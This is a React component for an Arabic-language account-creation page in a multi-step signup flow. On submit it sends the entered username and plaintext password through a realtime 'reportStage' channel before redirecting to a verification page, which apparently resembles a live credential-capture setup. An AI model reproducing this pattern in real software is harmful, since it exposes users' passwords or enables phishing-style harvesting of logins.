import { useEffect, useState } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';
import { ChevronLeft, ChevronRight, Eye, EyeOff } from 'lucide-react';

export default function CreateAccount() {
  const [, setLocation] = useLocation();
  const { data, updateData } = useRegistration();
  const { reportStage } = useRealtime();
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    reportStage('create_account', {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!data.username.trim()) newErrors.username = 'اسم المستخدم مطلوب';
    if (password.length < 6) newErrors.password = 'كلمة المرور يجب أن تكون 6 أحرف على الأقل';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      reportStage('create_account', { username: data.username, password });
      setLocation('/verify');
    }
  };

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in slide-in-from-right-8 duration-500">
        
        <div className="mb-10 flex items-center justify-between">
          <div className="space-y-2">
            <h1 className="text-4xl font-bold text-foreground tracking-tight">بيانات الحساب</h1>
            <p className="text-muted-foreground text-base">قم بإنشاء بيانات تسجيل الدخول الخاصة بك</p>
          </div>
          <Link href="/signup" className="w-12 h-12 flex items-center justify-center rounded-full bg-card border border-border hover:bg-accent transition-colors shadow-sm">
            <ChevronRight className="w-6 h-6 text-foreground" />
          </Link>
        </div>

        <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary via-primary/50 to-transparent" />
          
          <form onSubmit={handleSubmit} className="space-y-8 relative z-10">
            <div className="space-y-3">
              <Label htmlFor="username" className="text-base">اسم المستخدم</Label>
              <Input
                id="username"
                dir="ltr"
                className={`h-14 text-base text-right font-mono ${errors.username ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                placeholder=""
                value={data.username}
                onChange={e => updateData({ username: e.target.value })}
              />
              {errors.username && <p className="text-sm text-destructive font-medium">{errors.username}</p>}
            </div>

            <div className="space-y-3 relative">
              <Label htmlFor="password" className="text-base">كلمة المرور</Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  dir="ltr"
                  className={`h-14 text-base text-right pl-12 font-mono ${errors.password ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                  placeholder="••••••••"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors p-1"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {errors.password && <p className="text-sm text-destructive font-medium">{errors.password}</p>}
            </div>

            <Button type="submit" size="lg" className="w-full h-14 gap-3 mt-6 text-lg rounded-xl">
              تأكيد بيانات الحساب
              <ChevronLeft className="w-5 h-5" />
            </Button>
          </form>
        </div>
        
        <div className="mt-10 flex justify-center gap-3">
          <div className="h-2 w-10 rounded-full bg-border" />
          <div className="h-2 w-10 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,0.5)]" />
          <div className="h-2 w-10 rounded-full bg-border" />
        </div>
      </div>
    </AppLayout>
  );
}
